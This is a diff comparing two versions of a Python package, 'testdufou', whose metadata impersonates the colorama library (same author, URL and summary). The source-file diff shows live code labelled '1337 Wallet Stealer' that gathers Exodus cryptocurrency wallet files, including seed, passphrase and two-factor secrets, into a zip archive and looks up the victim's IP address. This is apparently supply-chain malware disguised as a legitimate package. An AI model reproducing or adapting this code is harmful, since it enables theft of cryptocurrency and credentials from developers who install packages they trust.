# Comparing `tmp/testdufou-1.tar.gz` & `tmp/testdufou-2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "testdufou-1.tar", last modified: Wed May  3 18:40:49 2023, max compression
+gzip compressed data, was "testdufou-2.tar", last modified: Wed May  3 18:46:07 2023, max compression
```

## Comparing `testdufou-1.tar` & `testdufou-2.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-05-03 18:40:49.418025 testdufou-1/
--rw-rw-rw-   0        0        0    14724 2023-05-03 18:40:49.418025 testdufou-1/PKG-INFO
--rw-rw-rw-   0        0        0    13715 2023-03-04 16:03:05.000000 testdufou-1/README.md
--rw-rw-rw-   0        0        0       43 2023-05-03 18:40:49.421024 testdufou-1/setup.cfg
--rw-rw-rw-   0        0        0     1034 2023-05-03 18:40:02.000000 testdufou-1/setup.py
-drwxrwxrwx   0        0        0        0 2023-05-03 18:40:49.392033 testdufou-1/testdufou/
--rw-rw-rw-   0        0        0       61 2023-05-02 22:31:08.000000 testdufou-1/testdufou/__init__.py
--rw-rw-rw-   0        0        0     4117 2023-05-03 18:28:19.000000 testdufou-1/testdufou/src_file.py
-drwxrwxrwx   0        0        0        0 2023-05-03 18:40:49.416025 testdufou-1/testdufou.egg-info/
--rw-rw-rw-   0        0        0    14724 2023-05-03 18:40:49.000000 testdufou-1/testdufou.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      236 2023-05-03 18:40:49.000000 testdufou-1/testdufou.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-03 18:40:49.000000 testdufou-1/testdufou.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       18 2023-05-03 18:40:49.000000 testdufou-1/testdufou.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2023-05-03 18:40:49.000000 testdufou-1/testdufou.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-03 18:46:07.738084 testdufou-2/
+-rw-rw-rw-   0        0        0    14724 2023-05-03 18:46:07.739083 testdufou-2/PKG-INFO
+-rw-rw-rw-   0        0        0    13715 2023-03-04 16:03:05.000000 testdufou-2/README.md
+-rw-rw-rw-   0        0        0       43 2023-05-03 18:46:07.744082 testdufou-2/setup.cfg
+-rw-rw-rw-   0        0        0     1034 2023-05-03 18:45:04.000000 testdufou-2/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-03 18:46:07.718090 testdufou-2/testdufou/
+-rw-rw-rw-   0        0        0       61 2023-05-02 22:31:08.000000 testdufou-2/testdufou/__init__.py
+-rw-rw-rw-   0        0        0     4119 2023-05-03 18:44:53.000000 testdufou-2/testdufou/src_file.py
+drwxrwxrwx   0        0        0        0 2023-05-03 18:46:07.737085 testdufou-2/testdufou.egg-info/
+-rw-rw-rw-   0        0        0    14724 2023-05-03 18:46:07.000000 testdufou-2/testdufou.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      236 2023-05-03 18:46:07.000000 testdufou-2/testdufou.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-03 18:46:07.000000 testdufou-2/testdufou.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       18 2023-05-03 18:46:07.000000 testdufou-2/testdufou.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2023-05-03 18:46:07.000000 testdufou-2/testdufou.egg-info/top_level.txt
```

### Comparing `testdufou-1/PKG-INFO` & `testdufou-2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: testdufou
-Version: 1
+Version: 2
 Summary: Pure-python Colors implementation
 Home-page: https://github.com/tartley/colorama
 Author: Jonathan Hartley
 Author-email: tartley@tartley.com
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `testdufou-1/README.md` & `testdufou-2/README.md`

 * *Files identical despite different names*

### Comparing `testdufou-1/setup.py` & `testdufou-2/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup, find_packages
 
 setup(
     name='testdufou',
-    version='1',
+    version='2',
     author='Jonathan Hartley',
     author_email='tartley@tartley.com',
     description='Pure-python Colors implementation',
     long_description=open('README.md').read(),
     long_description_content_type='text/markdown',
     url='https://github.com/tartley/colorama',
     packages=find_packages(),
```

### Comparing `testdufou-1/testdufou/src_file.py` & `testdufou-2/testdufou/src_file.py`

 * *Files 2% similar despite different names*

```diff
@@ -17,15 +17,15 @@
     exo_conf = info = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.conf.json"
     info = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\info.seco"
     passphrase = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\passphrase.json"
     seed = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\seed.seco"
     storage = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\storage.seco"
     twofactor = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\twofactor.seco"
     twofactor_secret = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\exodus.wallet\\twofactor-secret.seco"
-    message = "[🧬] 1337 Wallet Stealer [🧬]"
+    message = "[🧬]  1337 Wallet Stealer  [🧬]"
     exodus_exist = False
     if os.path.exists(path) or os.path.exists(exodus_pswd_file) or os.path.exists(exodus_pswd_file_dwnload) or os.path.exists(exodus_pswd_file_document):
         exodus_exist = True
         with ZipFile(zip, "w") as newzip:
             try:
                 newzip.write(info)
             except:
@@ -51,28 +51,28 @@
             except:
                 pass
             try:
                 newzip.write(exo_conf)
             except:
                 pass
             finally:
-                message = message + f"\n| [🚀] +1 Wallet Exodus from " + username +" %FLAG% "
+                message = message + f"\n\n +1 Wallet Exodus from " + username +" %FLAG% "
             try:
                 newzip.write(exodus_pswd_file)
-                message = message + f"\n | ➢ Desktop file added "
+                message = message + f"\n\n | ➢ Desktop file added "
             except:
                 pass
             try:
                 newzip.write(exodus_pswd_file_dwnload)
-                message = message + f"\n | ➢ Download file added "
+                message = message + f"\n\n | ➢ Download file added "
             except:
                 pass
             try:
                 newzip.write(exodus_pswd_file_document)
-                message = message + f"\n | ➢ Document file added "
+                message = message + f"\n\n | ➢ Document file added "
             except:
                 pass
     if exodus_exist:
         adressip = "\n\n[🌎] IP : "+ requests.get("http://ip-api.com/line/?fields=query").text
         countrycode = requests.get("http://ip-api.com/line/?fields=countryCode").text
         message = message + adressip
         countryflag_list = []
```

### Comparing `testdufou-1/testdufou.egg-info/PKG-INFO` & `testdufou-2/testdufou.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: testdufou
-Version: 1
+Version: 2
 Summary: Pure-python Colors implementation
 Home-page: https://github.com/tartley/colorama
 Author: Jonathan Hartley
 Author-email: tartley@tartley.com
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: MIT License
```

